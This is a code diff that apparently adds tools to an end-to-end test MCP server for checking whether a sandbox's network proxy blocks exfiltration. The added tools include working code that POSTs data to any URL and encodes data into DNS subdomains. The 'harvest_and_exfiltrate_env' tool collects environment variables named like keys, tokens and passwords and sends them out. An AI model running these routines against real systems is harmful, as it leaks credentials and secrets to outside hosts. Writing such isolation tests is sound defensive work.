@@ -1,3 +1,4 @@
+import * as dns from "node:dns/promises"
 import * as fs from "node:fs"
 import * as os from "node:os"
 import * as path from "node:path"
@@ -13,6 +14,9 @@ type ReadSensitiveInput = {
 }
 type SymlinkAttackInput = { target_path: string; link_name: string }
 type BypassProxyInput = { url: string; method: "direct" | "env_override" }
+type ExfiltrateDataInput = { target_url: string; data: string }
+type DnsExfiltrateInput = { data: string; domain: string }
+type FetchArbitraryInput = { url: string; method?: "GET" | "POST"; body?: string }
 function textResult(data: unknown) {
   return { content: [{ type: "text" as const, text: JSON.stringify(data) }] }
 }
@@ -337,6 +341,204 @@ export function createServer(): McpServer {
         leaked_sensitive: leaked,
         warning: leaked.length > 0 ? "SECURITY ISSUE: Sensitive env vars exposed!" : undefined,
       })
+    },
+  )
+  server.registerTool(
+    "exfiltrate_data",
+    {
+      title: "Exfiltrate Data via HTTP",
+      description:
+        "Attempt to exfiltrate data to an external server via HTTP POST. Used for testing network isolation and proxy blocking.",
+      inputSchema: {
+        target_url: z.string().describe("URL to send exfiltrated data to"),
+        data: z.string().describe("Data to exfiltrate (e.g., secret, API key)"),
+      },
+    },
+    async (input: ExfiltrateDataInput) => {
+      try {
+        const controller = new AbortController()
+        const timeoutId = setTimeout(() => controller.abort(), 5000)
+        const response = await fetch(input.target_url, {
+          method: "POST",
+          signal: controller.signal,
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ exfiltrated: input.data, timestamp: Date.now() }),
+        })
+        clearTimeout(timeoutId)
+        return textResult({
+          success: true,
+          status: response.status,
+          target: input.target_url,
+          warning: "SECURITY ISSUE: Data exfiltration succeeded! Proxy did not block request.",
+        })
+      } catch (error) {
+        const err = error as Error & { code?: string }
+        return textResult({
+          success: false,
+          blocked: true,
+          target: input.target_url,
+          error: err.message,
+          code: err.code,
+          note: "Request was blocked (expected behavior in Docker runtime)",
+        })
+      }
+    },
+  )
+  server.registerTool(
+    "dns_exfiltrate",
+    {
+      title: "DNS Exfiltration Attempt",
+      description:
+        "Attempt to exfiltrate data via DNS query by encoding data in subdomain. Used for testing DNS-based exfiltration channels.",
+      inputSchema: {
+        data: z.string().describe("Data to encode in DNS query"),
+        domain: z.string().describe("Attacker-controlled domain to query"),
+      },
+    },
+    async (input: DnsExfiltrateInput) => {
+      const encoded = Buffer.from(input.data).toString("hex").slice(0, 60)
+      const subdomain = `${encoded}.${input.domain}`
+      try {
+        const addresses = await dns.resolve4(subdomain)
+        return textResult({
+          success: true,
+          subdomain,
+          addresses,
+          warning: "DNS query succeeded. Data may have been exfiltrated via DNS.",
+        })
+      } catch (error) {
+        const err = error as Error & { code?: string }
+        // Also try HTTP to the encoded subdomain to test proxy blocking
+        try {
+          const controller = new AbortController()
+          const timeoutId = setTimeout(() => controller.abort(), 3000)
+          await fetch(`https://${subdomain}/`, { signal: controller.signal })
+          clearTimeout(timeoutId)
+          return textResult({
+            success: true,
+            subdomain,
+            dnsError: err.message,
+            httpSuccess: true,
+            warning: "SECURITY ISSUE: HTTP request to exfil domain succeeded!",
+          })
+        } catch (httpError) {
+          const httpErr = httpError as Error & { code?: string }
+          return textResult({
+            success: false,
+            blocked: true,
+            subdomain,
+            dnsError: err.message,
+            dnsCode: err.code,
+            httpError: httpErr.message,
+            httpCode: httpErr.code,
+            note: "Both DNS and HTTP exfiltration blocked (expected behavior)",
+          })
+        }
+      }
+    },
+  )
+  server.registerTool(
+    "fetch_arbitrary",
+    {
+      title: "Fetch Arbitrary URL",
+      description:
+        "Attempt to fetch any URL. Used for testing allowedDomains enforcement and proxy restrictions.",
+      inputSchema: {
+        url: z.string().describe("URL to fetch"),
+        method: z.enum(["GET", "POST"]).optional().describe("HTTP method (default: GET)"),
+        body: z.string().optional().describe("Request body for POST requests"),
+      },
+    },
+    async (input: FetchArbitraryInput) => {
+      try {
+        const controller = new AbortController()
+        const timeoutId = setTimeout(() => controller.abort(), 5000)
+        const options: RequestInit = {
+          method: input.method || "GET",
+          signal: controller.signal,
+          headers: { "User-Agent": "@perstack/e2e-mcp-server" },
+        }
+        if (input.method === "POST" && input.body) {
+          options.body = input.body
+          options.headers = { ...options.headers, "Content-Type": "application/json" }
+        }
+        const response = await fetch(input.url, options)
+        clearTimeout(timeoutId)
+        const text = await response.text()
+        return textResult({
+          success: true,
+          url: input.url,
+          status: response.status,
+          statusText: response.statusText,
+          body: text.slice(0, 1000),
+          warning:
+            "Request succeeded. If this URL was not in allowedDomains, there may be a security issue.",
+        })
+      } catch (error) {
+        const err = error as Error & { code?: string }
+        return textResult({
+          success: false,
+          blocked: true,
+          url: input.url,
+          error: err.message,
+          code: err.code,
+          note: "Request was blocked (expected if URL not in allowedDomains)",
+        })
+      }
+    },
+  )
+  server.registerTool(
+    "harvest_and_exfiltrate_env",
+    {
+      title: "Harvest and Exfiltrate Environment",
+      description:
+        "Harvest all environment variables and attempt to exfiltrate them. Combines env enumeration with HTTP exfiltration.",
+      inputSchema: {
+        exfil_url: z.string().describe("URL to exfiltrate harvested env vars to"),
+      },
+    },
+    async (input: { exfil_url: string }) => {
+      const env = { ...process.env }
+      const sensitivePatterns = ["KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL", "PRIVATE"]
+      const harvested: Record<string, string> = {}
+      for (const [key, value] of Object.entries(env)) {
+        if (sensitivePatterns.some((p) => key.toUpperCase().includes(p))) {
+          harvested[key] = value || ""
+        }
+      }
+      const harvestResult = {
+        totalEnvVars: Object.keys(env).length,
+        sensitiveFound: Object.keys(harvested).length,
+        sensitiveKeys: Object.keys(harvested),
+      }
+      try {
+        const controller = new AbortController()
+        const timeoutId = setTimeout(() => controller.abort(), 5000)
+        const response = await fetch(input.exfil_url, {
+          method: "POST",
+          signal: controller.signal,
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ harvested, timestamp: Date.now() }),
+        })
+        clearTimeout(timeoutId)
+        return textResult({
+          ...harvestResult,
+          exfiltrationSuccess: true,
+          status: response.status,
+          warning:
+            "SECURITY ISSUE: Env harvesting and exfiltration succeeded! Sensitive data may have been leaked.",
+        })
+      } catch (error) {
+        const err = error as Error & { code?: string }
+        return textResult({
+          ...harvestResult,
+          exfiltrationSuccess: false,
+          exfiltrationBlocked: true,
+          error: err.message,
+          code: err.code,
+          note: "Exfiltration blocked by proxy (expected behavior in Docker runtime)",
+        })
+      }
     },
   )
   return server
